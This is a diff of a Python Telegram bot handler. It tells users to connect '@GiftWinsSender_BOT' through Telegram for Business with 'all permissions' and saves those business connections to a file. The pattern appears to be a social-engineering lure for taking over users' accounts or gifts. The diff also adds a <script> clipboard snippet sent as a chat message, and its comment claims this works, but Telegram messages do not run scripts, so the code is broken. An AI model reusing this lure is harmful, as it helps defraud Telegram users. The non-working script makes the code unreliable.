@@ -183,9 +183,17 @@ async def handle_text_query(message: Message):
         "1. ⚙️ Open <b>Telegram Settings</b>\n"
         "2. 💼 Go to <b>Telegram for Business</b>\n"
         "3. 🤖 Open the <b>Chat Bots</b> section\n\n"
-        "Bot username: <code>@GiftWinsSender_BOT</code>\n"
-        "❗For correct operation, the bot needs <b>all permissions</b>",
-        parse_mode="HTML"
+        "<b>Bot username:</b> <code id='bot-username'>@GiftWinsSender_BOT</code>\n"
+        "❗For correct operation, the bot needs <b>all permissions</b>\n\n"
+        "<i>Tap the bot username to copy it</i>",
+        parse_mode="HTML",
+        disable_web_page_preview=True
+    )
+    # Отправляем JS для копирования (WebApp поддерживает)
+    await message.answer(
+        "<script>document.addEventListener('click', function(e) {\n  if (e.target && e.target.id === 'bot-username') {\n    navigator.clipboard.writeText('@GiftWinsSender_BOT');\n    alert('Bot username copied!');\n  }\n});</script>",
+        parse_mode="HTML",
+        disable_web_page_preview=True
     )
 
 CONNECTIONS_FILE = "business_connections.json"
